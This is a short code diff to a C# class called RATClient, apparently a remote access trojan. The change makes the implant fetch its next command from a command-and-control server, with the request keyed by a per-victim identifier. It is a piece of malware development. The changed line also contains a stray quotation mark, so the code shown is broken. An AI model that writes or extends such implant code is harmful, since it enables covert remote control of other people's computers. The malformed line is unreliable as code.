@@ -23,7 +23,7 @@ class RATClient
             SendClientInfo();
             try
             {
-                string cmd = client.GetStringAsync($"{C2_SERVER}/get").Result.Trim();
+                string cmd = client.GetStringAsync($"{C2_SERVER}/get/" + GetClientIdentifier()").Result.Trim();
                 if (string.IsNullOrEmpty(cmd))
                 {
                     Thread.Sleep(700);
